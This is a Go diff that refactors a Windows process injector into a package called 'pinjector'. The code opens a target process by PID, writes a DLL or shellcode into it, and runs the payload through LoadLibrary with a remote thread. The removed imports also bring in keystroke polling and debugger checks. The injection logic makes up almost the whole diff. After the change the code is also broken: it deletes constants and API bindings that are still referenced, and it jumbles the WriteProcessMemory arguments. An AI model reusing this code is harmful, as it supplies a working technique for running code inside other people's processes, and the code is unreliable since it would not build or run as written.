@@ -1,11 +1,7 @@
-package main
+package pinjector
 
 import (
-	"flag"
 	"fmt"
-	"log"
-	"os"
-	"runtime"
 	"syscall"
 	"unsafe"
 
@@ -13,26 +9,6 @@ import (
 )
 
 const (
-	PROCESS_CREATE_PROCESS            = 0x0080
-	PROCESS_CREATE_THREAD             = 0x0002
-	PROCESS_DUP_HANDLE                = 0x0040
-	PROCESS_QUERY_INFORMATION         = 0x0400
-	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
-	PROCESS_SET_INFORMATION           = 0x0200
-	PROCESS_SET_QUOTA                 = 0x0100
-	PROCESS_SUSPEND_RESUME            = 0x0800
-	PROCESS_TERMINATE                 = 0x0001
-	PROCESS_VM_OPERATION              = 0x0008
-	PROCESS_VM_READ                   = 0x0010
-	PROCESS_VM_WRITE                  = 0x0020
-	PROCESS_ALL_ACCESS                = 0x001F0FFF
-
-	PAGE_EXECUTE_READWRITE = 0x00000040
-
-	MEM_COMMIT  = 0x1000
-	MEM_RESERVE = 0x2000
-	MEM_RELEASE = 0x8000
-
 	nullRef = 0
 )
 
@@ -52,32 +28,6 @@ type Inject struct {
 type TOKEN struct {
 	tokenhandle syscall.Token
 }
-
-var (
-	ModKernel32 = syscall.NewLazyDLL("kernel32.dll")
-	modUser32   = syscall.NewLazyDLL("user32.dll")
-	modAdvapi32 = syscall.NewLazyDLL("Advapi32.dll")
-
-	ProcOpenProcessToken      = modAdvapi32.NewProc("GetProcessToken")
-	ProcLookupPrivilegeValueW = modAdvapi32.NewProc("LookupPrivilegeValueW")
-	ProcLookupPrivilegeNameW  = modAdvapi32.NewProc("LookupPrivilegeNameW")
-	ProcAdjustTokenPrivileges = modAdvapi32.NewProc("AdjustTokenPrivileges")
-	ProcGetAsyncKeyState      = modUser32.NewProc("GetAsyncKeyState")
-	ProcVirtualAlloc          = ModKernel32.NewProc("VirtualAlloc")
-	ProcCreateThread          = ModKernel32.NewProc("CreateThread")
-	ProcWaitForSingleObject   = ModKernel32.NewProc("WaitForSingleObject")
-	ProcVirtualAllocEx        = ModKernel32.NewProc("VirtualAllocEx")
-	ProcVirtualFreeEx         = ModKernel32.NewProc("VirtualFreeEx")
-	ProcCreateRemoteThread    = ModKernel32.NewProc("CreateRemoteThread")
-	ProcGetLastError          = ModKernel32.NewProc("GetLastError")
-	ProcWriteProcessMemory    = ModKernel32.NewProc("WriteProcessMemory")
-	ProcOpenProcess           = ModKernel32.NewProc("OpenProcess")
-	ProcGetCurrentProcess     = ModKernel32.NewProc("GetCurrentProcess")
-	ProcIsDebuggerPresent     = ModKernel32.NewProc("IsDebuggerPresent")
-	ProcGetProcAddress        = ModKernel32.NewProc("GetProcAddress")
-	ProcCloseHandle           = ModKernel32.NewProc("CloseHandle")
-	ProcGetExitCodeThread     = ModKernel32.NewProc("GetExitCodeThread")
-)
 
 func OpenProcessHandle(i *Inject) error {
 	var rights uint32 = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
@@ -116,19 +66,17 @@ func VirtualAllocEx(i *Inject) error {
 
 func WriteProcessMemory(i *Inject) error {
 	var nBytesWritten *byte
-	//dllPathBytes, err := syscall.BytePtrFromString(i.DllPath)
-	//if err != nil {
-	//	return err
-	//}
+	dllPathBytes, err := syscall.BytePtrFromString(i.DllPath)
+	if err != nil {
+		return err
+	}
 	writeMem, _, lastErr := ProcWriteProcessMemory.Call(
 		i.RemoteProcHandle,
 		i.Lpaddr,
 		i.DLLBytes,
-		//uintptr(unsafe.Pointer(dllPathBytes)),
-		uintptr(i.DLLSize),
+		uintptr(unsafe.Pointer(dllPathBytes)),
 		uintptr(unsafe.Pointer(nBytesWritten)))
 	if writeMem == 0 {
-		//fmt.Printf("dll is : %v\n", len(dllBytes)) //Debug
 		return errors.Wrap(lastErr, "[!] ERROR : Can't write to process memory.")
 	}
 	return nil
@@ -210,66 +158,4 @@ func VirtualFreeEx(i *Inject) error {
 	}
 	fmt.Println("[+] Success: Freed memory region")
 	return nil
-}
-
-func main() {
-	var scFlag = flag.String("f", "", "absolute path to shellcode file to inject")
-	var pidFlag = flag.Int("p", 0, "pid to inject")
-
-	flag.Parse()
-
-	if *scFlag == "" || *pidFlag < 1 {
-
-		fmt.Printf("[!] -f: %v -p: %v", *scFlag, *pidFlag)
-		fmt.Println("[!] ERROR : use -f and -p.")
-	}
-
-	dllBytes, err := os.ReadFile(*scFlag)
-	if err != nil {
-		log.Fatal("[!] ERROR : Can't read dll.", err)
-	}
-
-	inj := Inject{
-		DllPath:  *scFlag,
-		DLLSize:  uint32(len(dllBytes)),
-		DLLBytes: uintptr(unsafe.Pointer(&dllBytes[0])),
-		Pid:      uint32(*pidFlag),
-	}
-
-	err = OpenProcessHandle(&inj)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	err = VirtualAllocEx(&inj)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	err = WriteProcessMemory(&inj)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	err = GetLoadLibAddress(&inj)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	err = CreateRemoteThread(&inj)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	err = WaitForSingleObject(&inj)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	err = VirtualFreeEx(&inj)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	runtime.KeepAlive(inj.DLLBytes)
 }
